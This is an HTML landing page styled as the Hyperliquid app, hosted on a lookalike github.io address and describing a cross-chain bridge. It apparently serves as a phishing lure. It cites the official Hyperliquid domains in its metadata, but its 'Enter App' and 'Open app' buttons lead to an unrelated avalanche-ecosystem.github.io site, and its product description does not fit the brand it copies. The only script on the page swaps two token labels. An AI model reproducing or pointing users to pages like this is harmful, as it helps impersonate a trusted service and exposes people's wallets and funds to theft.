<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Hyperliquid - Enter App</title>
  <meta name="description" content="Hyperliquid bridges across Ethereum, Base, Optimism and OP Stack chains from your own wallet.">
  <link rel="canonical" href="https://hyperliquid-usa.github.io/">
  <meta name="robots" content="index,follow,max-image-preview:large">
  <meta name="theme-color" content="#08090D">
  <meta property="og:type" content="website">
  <meta property="og:title" content="Hyperliquid">
  <meta property="og:description" content="Hyperliquid bridges across Ethereum, Base, Optimism and OP Stack chains from your own wallet.">
  <meta property="og:url" content="https://hyperliquid-usa.github.io/">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Hyperliquid">
  <meta name="twitter:description" content="Hyperliquid bridges across Ethereum, Base, Optimism and OP Stack chains from your own wallet.">
  <link rel="icon" type="image/png" href="favicon.png">
  <link rel="apple-touch-icon" href="favicon.png">
  <link rel="manifest" href="site.webmanifest">
  <link rel="stylesheet" href="style.css">
  <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@graph": [
      {
        "@type": "WebSite",
        "@id": "https://hyperliquid-usa.github.io/#website",
        "url": "https://hyperliquid-usa.github.io/",
        "name": "Hyperliquid",
        "inLanguage": "en"
      },
      {
        "@type": "Organization",
        "@id": "https://hyperliquid-usa.github.io/#organization",
        "name": "Hyperliquid",
        "url": "https://Hyperliquid.app/",
        "sameAs": [
          "https://Hyperliquid.app/",
          "https://docs.Hyperliquid.app/",
          "https://help.Hyperliquid.app/"
        ]
      },
      {
        "@type": "WebApplication",
        "@id": "https://hyperliquid-usa.github.io/#app",
        "name": "Hyperliquid",
        "applicationCategory": "FinanceApplication",
        "operatingSystem": "Web",
        "url": "https://hyperliquid-usa.github.io/",
        "publisher": { "@id": "https://hyperliquid-usa.github.io/#organization" },
        "description": "Hyperliquid bridges across Ethereum, Base, Optimism and OP Stack chains from your own wallet."
      }
    ]
  }
  </script>
</head>
<body>
  <header class="topbar">
    <div class="brand" aria-label="Hyperliquid">
      <img src="favicon.png" width="30" height="30" alt="">
      <span>Hyperliquid</span>
    </div>
    <nav class="nav" aria-label="Trusted references">
      <a href="https://etherscan.io/" target="_blank" rel="nofollow noopener noreferrer">Etherscan</a>
      <a href="https://ethereum.org/bridges/" target="_blank" rel="nofollow noopener noreferrer">Ethereum bridges</a>
      <a href="https://docs.Hyperliquid.app/" target="_blank" rel="nofollow noopener noreferrer">Hyperliquid docs</a>
    </nav>
    <span class="spacer"></span>
    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
  </header>

  <main class="stage">
    <section class="hero" aria-labelledby="page-title">
      <h1 id="page-title">Hyperliquid</h1>
      <p class="sub"><strong>Hyperliquid</strong> bridges across Ethereum, Base, Optimism and OP Stack chains from your own wallet.</p>
    </section>

    <section class="card" aria-label="Bridge preview">
      <div class="card-label">Bridge</div>
      <div class="route">
        <div class="leg">
          <span class="label">From</span>
          <span class="chip">
            <img src="eth.png" width="28" height="28" alt="ETH">
            <span>ETH</span>
          </span>
        </div>
        <button class="switch" type="button" data-switch aria-label="Switch direction">
          <span aria-hidden="true">&#8594;</span>
        </button>
        <div class="leg">
          <span class="label">To</span>
          <span class="chip">
            <img src="usdc.png" width="28" height="28" alt="USDC">
            <span>USDC</span>
          </span>
        </div>
      </div>
      <a class="primary" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App</a>
      <p class="note">Preview only</p>
    </section>
  </main>

  <footer class="foot"><b>Hyperliquid</b> &mdash; 2026</footer>

  <script>
  (function () {
    "use strict";
    var button = document.querySelector("[data-switch]");
    if (!button) return;
    button.addEventListener("click", function () {
      var chips = document.querySelectorAll(".leg .chip");
      if (chips.length < 2) return;
      var first = chips[0].innerHTML;
      chips[0].innerHTML = chips[1].innerHTML;
      chips[1].innerHTML = first;
    });
  })();
  </script>
</body>
</html>
